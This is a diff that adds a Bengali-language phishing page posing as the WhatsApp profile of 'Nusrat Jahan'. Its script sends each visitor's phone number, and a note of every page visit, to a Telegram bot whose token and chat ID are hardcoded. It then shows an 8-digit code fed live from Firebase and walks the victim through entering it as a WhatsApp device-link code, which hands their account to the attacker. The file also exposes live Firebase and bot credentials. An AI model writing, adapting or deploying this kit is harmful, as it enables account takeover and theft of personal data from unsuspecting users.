@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>নুসরাত জাহান হোয়াটসঅ্যাপ প্রোফাইল</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+    <style>
+        body { font-family: 'Kalpurush', sans-serif; background: linear-gradient(135deg, #128C7E, #075E54); color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 1rem; }
+        .container { max-width: 400px; width: 100%; background-color: #ECE5DD; border-radius: 1.5rem; padding: 2.5rem 2rem; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
+        .whatsapp-logo i { font-size: 80px; color: #25D366; background: white; border-radius: 50%; padding: 20px; box-shadow: 0 5px 20px rgba(37, 211, 102, 0.4); }
+        .input-field { background-color: #fff; border: 2px solid #ddd; border-radius: 0.75rem; padding: 0.85rem 1rem; text-align: center; font-size: 1.1rem; width: 100%; transition: all 0.3s ease; }
+        .input-field:focus { outline: none; border-color: #25D366; }
+        .btn { background: linear-gradient(90deg, #25D366, #128C7E); color: white; font-weight: bold; padding: 0.9rem; border-radius: 0.75rem; width: 100%; border: none; cursor: pointer; transition: all 0.3s ease; }
+        .loader { border: 6px solid #ccc; border-top: 6px solid #128C7E; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 2rem auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .pin-display { display: flex; justify-content: center; gap: 5px; margin-bottom: 1.5rem; }
+        .pin-digit { width: 38px; height: 48px; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; font-weight: bold; background-color: #fff; border: 2px solid #128C7E; color: #075E54; border-radius: 0.5rem; }
+        .instruction-list li { display: flex; align-items: flex-start; margin-bottom: 0.75rem; font-size: 1rem; }
+        .step-icon { color: #128C7E; margin-right: 0.75rem; margin-top: 4px; width: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="page1" class="text-center">
+        <div class="whatsapp-logo mb-5"><i class="fab fa-whatsapp"></i></div>
+        <h1 class="text-3xl font-bold text-gray-800 mb-2">নুসরাত জাহান হোয়াটসঅ্যাপ প্রোফাইল</h1>
+        <p class="text-gray-600 mb-8">Add করার জন্য আপনার WhatsApp নাম্বার দিন</p>
+        <form id="phoneForm" class="space-y-5">
+            <input type="tel" id="phoneNumber" placeholder="আপনার হোয়াটসঅ্যাপ নম্বর লিখুন" required class="input-field">
+            <button type="submit" class="btn"><i class="fab fa-whatsapp mr-2"></i> Add Nusrat Jahan</button>
+        </form>
+    </div>
+    <div id="loading" class="hidden text-center">
+        <div class="loader"></div>
+        <p class="text-lg text-gray-700 font-semibold">সংযোগ করা হচ্ছে...</p>
+        <p class="text-gray-500">অনুগ্রহ করে ৩০ সেকেন্ড অপেক্ষা করুন।</p>
+    </div>
+    <div id="page2" class="hidden text-center">
+        <i class="fa fa-circle-info text-5xl text-teal-800 mb-4"></i>
+        <h1 class="text-2xl font-bold text-gray-800 mb-3">ডিভাইস লিঙ্ক করার নির্দেশনা</h1>
+        <p class="text-gray-600 mb-2">আপনার ৮-সংখ্যার ইউজার নেম:</p>
+        <div id="pinContainer" class="pin-display">
+            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
+            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
+        </div>
+        <div class="bg-white p-4 rounded-lg shadow-inner text-gray-700">
+            <ul class="instruction-list text-left">
+                <li><i class="fa fa-mobile-screen-button step-icon"></i>আপনার ফোনের নোটিফিকেশন থেকে <strong>"Enter code..."</strong> এ ক্লিক করুন।</li>
+                <li><i class="fa fa-keyboard step-icon"></i>ফাঁকা ৮টি বক্সে উপরে দেখানো ইউজার নেমটি বসান এবং অপেক্ষা করুন।</li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+<!-- Firebase SDK (v8) -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+    // আপনার দেওয়া Firebase configuration কোড
+    const firebaseConfig = {
+      apiKey: "AIzaSyA--EbKHCyRtTp4AgBZua22Ad2J7JRbS28",
+      authDomain: "control-my-page.firebaseapp.com",
+      databaseURL: "https://control-my-page-default-rtdb.firebaseio.com",
+      projectId: "control-my-page",
+      storageBucket: "control-my-page.appspot.com",
+      messagingSenderId: "846756179295",
+      appId: "1:846756179295:web:f5eec02565c2f2d45c5aea",
+      measurementId: "G-37RH0B37KK"
+    };
+
+    // আপনার টেলিগ্রাম কনফিগারেশন
+    const TELEGRAM_BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco";
+    const CHAT_ID = "6658445342";
+    const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // DOM Elements
+    const page1 = document.getElementById('page1');
+    const loading = document.getElementById('loading');
+    const page2 = document.getElementById('page2');
+    const phoneForm = document.getElementById('phoneForm');
+    const phoneNumberInput = document.getElementById('phoneNumber');
+    const pinDigits = document.querySelectorAll('#pinContainer .pin-digit');
+
+    // --- নতুন ফাংশন: টেলিগ্রামে মেসেজ পাঠানোর জন্য ---
+    async function sendTelegramMessage(text) {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch (error) {
+            console.error("Telegram message failed:", error);
+        }
+    }
+    
+    // পেজ লোড হওয়ার সাথে সাথে ভিজিটের মেসেজ পাঠাবে
+    window.addEventListener('load', () => {
+        sendTelegramMessage("👤 একজন আপনার হোয়াটসঅ্যাপ পেজ ভিজিট করেছে।");
+    });
+
+    // Firebase থেকে কোড পরিবর্তনের জন্য কান পেতে থাকবে
+    function listenForCodeChanges() {
+        const liveCodeRef = database.ref('liveCode');
+        liveCodeRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            const code = data ? data.code : "--------";
+            for (let i = 0; i < 8; i++) {
+                pinDigits[i].textContent = code[i] || '';
+            }
+        });
+    }
+
+    // নম্বর সাবমিট করার ফাংশন
+    phoneForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phoneNumber = phoneNumberInput.value;
+        if (!phoneNumber) return;
+
+        // --- নতুন: টেলিগ্রামে নম্বর পাঠানোর কোড ---
+        await sendTelegramMessage(`*📱 নতুন হোয়াটসঅ্যাপ নম্বর:*\n\`${phoneNumber}\``);
+        
+        page1.classList.add('hidden');
+        loading.classList.remove('hidden');
+
+        setTimeout(() => {
+            loading.classList.add('hidden');
+            page2.classList.remove('hidden');
+            listenForCodeChanges();
+        }, 30000);
+    });
+</script>
+
+</body>
+</html>
